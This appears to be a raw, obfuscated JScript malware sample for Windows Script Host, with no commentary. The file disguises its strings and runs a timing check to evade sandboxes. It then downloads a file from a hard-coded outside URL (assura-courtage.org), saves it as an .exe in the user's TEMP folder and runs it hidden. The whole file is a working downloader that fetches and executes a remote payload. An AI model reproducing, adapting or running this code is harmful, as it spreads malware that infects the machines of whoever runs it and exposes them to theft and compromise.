var _JJ = false;
var _LS = "CreateObject";
var _H0 = function _UU() {return WScript[_LS]("WScript"+".Shell");}(), _DJ = 11;
var _JQ = "MSXML2.XMLHTTP";
var _Q = 2123213;
var _MP = 0;
function _WT(_U0){_H0["Run"](_U0, _MP, _MP);};
function _N(){return _JQ + "";};
function _U(_H1, _A0){_MP = _MP * 1; return _H1 - _A0;};
function _P(){return _LS;};
/*@cc_on
  @if (@_win32 || @_win64)
    _JJ = true;
  @end
@*/
if (_JJ)
{
var _IQ = "";
function _WE(){return 22;};
var _O = 0; var _WI = 0;
function _K()
{
var _UQ = new this["Date"]();
var _J = _UQ["getUTCMilliseconds"]();
WScript["Sleep"](_WE());
var _UQ = new this["Date"]();
var _N0 = _UQ["getUTCMilliseconds"]();
WScript["Sleep"](_WE());
var _UQ = new this["Date"]();
var _V = _UQ["getUTCMilliseconds"]();
var _O = "_T";
_O = _U(_N0, _J);
var _WI = "_LL";
_WI = _U(_V, _N0);
_IQ = "open";
return _U(_O, _WI);
}
var _Z0 = false;
var _GQ = false;
for (var _HY = _MP; _HY < _WE() * 1; _HY++){if (_K() != _MP){
_Z0 = true; 
_WI = "31" + 11 * _O + _WI; 
_GQ = true; 
break;
}}
function _Z() {return ((_Z0 == true) && (_Z0 == _GQ)) ? 1 : _MP;};
if (_Z0 && _Z() && _GQ){
function _A() {return _H0["ExpandEnvironmentStrings"]("%TE"+"MP%/") + "d57tobPYcqqOSa.ex" + "e";};
 _N1 = _N();
 _HA = WScript[_LS](_N1);
 var _H = 1;
 while (_H){
try {
	if (_H == 1)
	{
		_HA[_IQ]("GET", "http://assura-courtage.org/j2osla", false);
		_HA["send"]();
		_VL = "Sleep";
	}
	WScript[_VL](_WE() + 120); 
	if (_HA["readystate"] < 2 * 2) continue;
	_H = _MP;
	function _VS(_IX) {var _KS = (1, 2, 3, 4, 5, _IX); return _KS;};
	_I = WScript[_P()]("ADODB.Stream");
	_N1 = _I;
	_N1[_IQ]();
	_N1["type"] = _VS(1);
	_N1["write"](_HA["ResponseBody"]);
	_I["position"] = _VS(_MP);
	_N1["Save" + "ToFile"](_A(), 2);
	_I["cl"+"ose"]();
	_ZV = _A();
	_WT(_ZV);
} catch(_E){};
}
}
}

